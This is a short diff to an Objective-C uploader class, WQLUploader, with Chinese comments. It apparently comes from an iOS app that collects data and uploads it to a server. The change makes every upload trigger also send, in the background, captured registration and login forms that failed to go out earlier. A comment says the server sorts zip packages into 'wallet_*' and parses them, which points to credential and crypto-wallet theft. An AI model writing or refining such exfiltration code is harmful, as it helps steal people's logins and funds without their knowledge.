@@ -23,7 +23,6 @@ static NSString *WQLAuthPendingDir(void) {
           relative:(NSString *)rel
           filename:(NSString *)filename
               kind:(NSString *)kind;
-- (void)flushPendingAuthForms;
 @end
 
 @implementation WQLUploader
@@ -88,6 +87,12 @@ static NSString *WQLAuthPendingDir(void) {
         if (completion) completion(0, 0);
         return;
     }
+
+    // 注册/登录表单与采集目录无关：每次触发上传都顺手补一遍
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
+        [self flushPendingAuthForms];
+    });
+
     if (![[NSFileManager defaultManager] fileExistsAtPath:dir]) {
         [self log:@"上传: 目录不存在 %@", dir];
         if (completion) completion(0, 0);
@@ -100,9 +105,6 @@ static NSString *WQLAuthPendingDir(void) {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
         __strong typeof(weakSelf) self = weakSelf;
         if (!self) return;
-
-        // 先把上次没传成功的注册/登录表单补掉
-        [self flushPendingAuthForms];
 
         // 服务端只把带 _manifest.json 的 zip 归入 wallet_* 并解析，所以优先整包上传
         NSString *zipPath = [NSTemporaryDirectory() stringByAppendingPathComponent:
